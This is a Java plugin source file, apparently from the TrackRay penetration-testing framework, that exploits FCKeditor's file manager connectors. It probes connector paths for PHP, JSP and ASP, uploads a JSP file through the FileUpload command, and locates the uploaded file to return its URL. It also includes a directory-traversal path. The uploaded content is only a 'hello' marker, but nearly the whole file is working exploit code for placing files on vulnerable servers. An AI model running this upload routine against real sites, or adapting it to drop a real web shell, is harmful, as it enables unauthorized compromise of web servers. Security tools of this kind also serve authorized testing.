package com.trackray.module.plugin.webapp.fckeditor;

import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.CommonPlugin;
import org.javaweb.core.net.HttpResponse;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.net.MalformedURLException;
import java.util.*;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/4/9 11:10
 */
@Plugin(value = "fckeditor_getshell" , title = "fckeditor编辑器Getshell" ,author = "浅蓝" )
@Rule(
        params = {
        @Param(key = "url",desc = "http://xxx/FCKeditor/")
})
public class FckeditorGetshell extends CommonPlugin {
    private String filename = "track.jsp";
    private String filedata = "<%=\"hello\"%>";
    private String url = "";
    private List<String > controllers;


    public String simple = "\r\n-----------------------------526180204290\r\n" +
            "Content-Disposition: form-data; name=\"NewFile\"; filename=\""+filename+"\"\r\n" +
            "Content-Type: application/octet-stream\r\n" +
            "\r\n" +
            filedata+"\r\n" +
            "-----------------------------526180204290--\r\n";

    public static String _simple = "editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=/&CurrentFolder=%2F";

    enum Lang{
        PHP(
                "editor/filemanager/browser/default/connectors/php/connector.php",
                "editor/filemanager/connectors/php/connector.php",
                "editor/filemanager/browser/default/connectors/php/connector.php"
        ),
        JAVA(
                "editor/filemanager/browser/default/connectors/jsp/connector"

        ),
        NET(
                "editor/filemanager/connectors/asp/connector.asp",
                "editor/filemanager/connectors/aspx/connector.aspx",
                "editor/filemanager/browser/default/connectors/asp/connector.asp"
        );

        private List<String> urls;
        Lang(String... url){
            if (url !=null && url.length>0)
                urls = Arrays.asList(url);
        }
        public List<String> getUrls() {
            return urls;
        }
    }
    private ArrayList<String> findController(){
        ArrayList<String> list = new ArrayList<>();
        for (Lang lang : Lang.values()) {
            List<String> urls = lang.getUrls();
            if (urls==null)
                continue;

            for (String url : urls) {
                url = this.url.concat(url);
                try {
                    HttpResponse req = requests.url(url).get();
                    if (req!=null && req.getStatusCode()!=404)
                        list.add(url);
                } catch (Exception e) {
                    continue;
                }
            }
        }
        return list;
    }

    /**
     * 目录遍历漏洞
     * @return
     */
    public String dirlist(){
        return "/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/../../../";
    }

    @Override
    public boolean check(Map param) {
        url = param.get(this.currentParams()[0].key()).toString();
        url = url.endsWith("/")?url:url.concat("/");

        ArrayList<String> controller = findController();
        if (controller.isEmpty())
            return false;
        this.controllers = controller;
        return true;
    }

    @Override
    public Object start() {
        Object shell = getshell(controllers);
        if (shell!=null)
            return shell;
        return "漏洞不存在";
    }

    private Object getshell(List<String> controllers) {
        for (String controller : controllers) {
            try {
                //requests.url(controller.concat(""))

                HttpResponse post = requests.url(controller.concat("?Command=FileUpload&Type=File&CurrentFolder=%2F"))
                        .data(simple)
                        .contentType("multipart/form-data; boundary=---------------------------526180204290")
                        .post();

                if (post.getStatusCode()==200){
                    String body = requests.url(controller.concat("?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/"))
                            .get().body();
                    if (body.contains(filename)){
                        Document parse = Jsoup.parse(body);
                        String attr = parse.getElementsByTag("CurrentFolder").attr("url");
                        String shell = this.url.concat(attr + filename);
                        return shell;
                    }
                }
            } catch (MalformedURLException e) {
                continue;
            }
        }
        return null;
    }
}
